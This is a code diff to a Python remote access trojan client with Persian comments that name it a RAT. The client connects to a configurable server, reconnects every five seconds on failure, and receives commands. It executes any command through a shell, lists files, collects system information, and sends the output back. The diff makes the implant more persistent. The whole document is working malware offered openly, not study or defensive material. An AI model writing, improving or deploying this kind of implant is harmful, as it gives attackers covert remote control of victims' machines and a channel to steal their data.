@@ -1,20 +1,23 @@
 import socket
 import subprocess
 import os
+import time
+
 # تنظیمات سرور RAT
-SERVER_IP = '127.0.0.1'  # آدرس IP سیستم هدف (برای تست می‌توانید از 'localhost' استفاده کنید)
+SERVER_IP = '127.0.0.1'  # آدرس IP سرور
 SERVER_PORT = 8080  # پورت برای ارتباط با سرور
 
 # ایجاد اتصال به سرور
 def connect_to_server():
-    try:
-        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client_socket.connect((SERVER_IP, SERVER_PORT))
-        print(f"Connected to server at {SERVER_IP}:{SERVER_PORT}")
-        return client_socket
-    except Exception as e:
-        print(f"Error connecting to server: {e}")
-        return None
+    while True:
+        try:
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.connect((SERVER_IP, SERVER_PORT))
+            print(f"Connected to server at {SERVER_IP}:{SERVER_PORT}")
+            return client_socket
+        except Exception as e:
+            print(f"Error connecting to server: {e}. Retrying...")
+            time.sleep(5)  # تلاش مجدد پس از 5 ثانیه
 
 # دریافت دستور از سرور و اجرا آن
 def receive_and_execute(client_socket):
@@ -22,31 +25,39 @@ def receive_and_execute(client_socket):
         try:
             # دریافت دستور از سرور
             command = client_socket.recv(1024).decode('utf-8')
-            if command.lower() == 'exit':
+            if not command:
+                break
+
+            # دستور 'exit' برای قطع ارتباط
+            elif command.lower() == 'exit':
                 print("Exiting...")
                 break
-            
-            # اگر دستور لیست فایل‌ها باشد
-            if command.lower() == 'list':
+
+            # دستور 'list' برای لیست کردن فایل‌ها
+            elif command.lower() == 'list':
                 files = os.listdir('.')
                 client_socket.send(str(files).encode())
-            
-            # اجرای دستور سیستم و ارسال نتایج
+
+            # دستور 'sysinfo' برای اطلاعات سیستم
             elif command.lower() == 'sysinfo':
                 system_info = os.popen("systeminfo").read()
                 client_socket.send(system_info.encode())
-            
-            # اجرای هر دستور shell
+
+            # اجرای دستور shell
             else:
-                output = subprocess.check_output(command, shell=True)
-                client_socket.send(output)
+                try:
+                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                    client_socket.send(output)
+                except subprocess.CalledProcessError as e:
+                    error_message = f"Error executing command: {e.output.decode('utf-8')}"
+                    client_socket.send(error_message.encode())
         except Exception as e:
             print(f"Error while receiving/executing command: {e}")
             break
 
 # برنامه اصلی
 if __name__ == "__main__":
-    client_socket = connect_to_server()
+    client_socket = connect_to_server()  # اتصال به سرور
     if client_socket:
-        receive_and_execute(client_socket)
-        client_socket.close()
+        receive_and_execute(client_socket)  # دریافت و اجرای دستورات
+        client_socket.close()  # بستن اتصال
